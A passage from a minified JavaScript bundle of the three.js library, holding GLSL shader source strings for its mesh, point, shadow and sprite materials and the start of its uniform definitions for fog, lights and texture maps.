<clipping_planes_vertex>\n\t#include <fog_vertex>\n}",linedashed_frag:"uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\t\tdiscard;\n\t}\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}",meshbasic_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinbase_vertex>\n\t\t#include <skinnormal_vertex>\n\t\t#include <defaultnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n}",meshbasic_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\t#ifdef USE_LIGHTMAP\n\t\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\t\treflectedLight.indirectDiffuse += lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t#else\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\t#endif\n\t#include <aomap_fragment>\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\t#include <envmap_fragment>\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshlambert_vert:"#define LAMBERT\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshlambert_frag:"uniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\t#else\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\t#endif\n\t#include <lightmap_fragment>\n\treflectedLight.indirectDiffuse *= BRDF_Lambert( diffuseColor.rgb );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\t#else\n\t\treflectedLight.directDiffuse = vLightFront;\n\t#endif\n\treflectedLight.directDiffuse *= BRDF_Lambert( diffuseColor.rgb ) * getShadowMask();\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshmatcap_vert:"#define MATCAP\nvarying vec3 vViewPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <color_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <normal_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <normal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\tvViewPosition = - mvPosition.xyz;\n}",meshmatcap_frag:"#define MATCAP\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\nvarying vec3 vViewPosition;\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <fog_pars_fragment>\n#include <normal_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;\n\t#ifdef USE_MATCAP\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\t#else\n\t\tvec4 matcapColor = vec4( 1.0 );\n\t#endif\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshnormal_vert:"#define NORMAL\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <normal_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <normal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n}",meshnormal_frag:"#define NORMAL\nuniform float opacity;\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#include <packing>\n#include <uv_pars_fragment>\n#include <normal_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n}",meshphong_vert:"#define PHONG\nvarying vec3 vViewPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <normal_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <normal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshphong_frag:"#define PHONG\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <normal_pars_fragment>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_phong_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphysical_vert:"#define STANDARD\nvarying vec3 vViewPosition;\n#ifdef USE_TRANSMISSION\n\tvarying vec3 vWorldPosition;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <normal_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <normal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n#ifdef USE_TRANSMISSION\n\tvWorldPosition = worldPosition.xyz;\n#endif\n}",meshphysical_frag:"#define STANDARD\n#ifdef PHYSICAL\n\t#define IOR\n\t#define SPECULAR\n#endif\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float roughness;\nuniform float metalness;\nuniform float opacity;\n#ifdef IOR\n\tuniform float ior;\n#endif\n#ifdef SPECULAR\n\tuniform float specularIntensity;\n\tuniform vec3 specularColor;\n\t#ifdef USE_SPECULARINTENSITYMAP\n\t\tuniform sampler2D specularIntensityMap;\n\t#endif\n\t#ifdef USE_SPECULARCOLORMAP\n\t\tuniform sampler2D specularColorMap;\n\t#endif\n#endif\n#ifdef USE_CLEARCOAT\n\tuniform float clearcoat;\n\tuniform float clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tuniform vec3 sheenColor;\n\tuniform float sheenRoughness;\n\t#ifdef USE_SHEENCOLORMAP\n\t\tuniform sampler2D sheenColorMap;\n\t#endif\n\t#ifdef USE_SHEENROUGHNESSMAP\n\t\tuniform sampler2D sheenRoughnessMap;\n\t#endif\n#endif\nvarying vec3 vViewPosition;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <normal_pars_fragment>\n#include <lights_physical_pars_fragment>\n#include <transmission_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <clearcoat_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <clearcoat_normal_fragment_begin>\n\t#include <clearcoat_normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;\n\tvec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;\n\t#include <transmission_fragment>\n\tvec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;\n\t#ifdef USE_SHEEN\n\t\tfloat sheenEnergyComp = 1.0 - 0.157 * max3( material.sheenColor );\n\t\toutgoingLight = outgoingLight * sheenEnergyComp + sheenSpecular;\n\t#endif\n\t#ifdef USE_CLEARCOAT\n\t\tfloat dotNVcc = saturate( dot( geometry.clearcoatNormal, geometry.viewDir ) );\n\t\tvec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );\n\t\toutgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + clearcoatSpecular * material.clearcoat;\n\t#endif\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshtoon_vert:"#define TOON\nvarying vec3 vViewPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <normal_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <normal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshtoon_frag:"#define TOON\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <normal_pars_fragment>\n#include <lights_toon_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_toon_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",points_vert:"uniform float size;\nuniform float scale;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\tgl_PointSize = size;\n\t#ifdef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\t#endif\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n}",points_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}",shadow_vert:"#include <common>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\nvoid main() {\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",shadow_frag:"uniform vec3 color;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\nvoid main() {\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",sprite_vert:"uniform float rotation;\nuniform vec2 center;\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\t#ifndef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\t#endif\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\tmvPosition.xy += rotatedPosition;\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}",sprite_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <alphatest_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\t#include <output_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}"},Yn={common:{diffuse:{value:new $t(16777215)},opacity:{value:1},map:{value:null},uvTransform:{value:new ie},uv2Transform:{value:new ie},alphaMap:{value:null},alphaTest:{value:0}},specularmap:{specularMap:{value:null}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new re(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new $t(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new 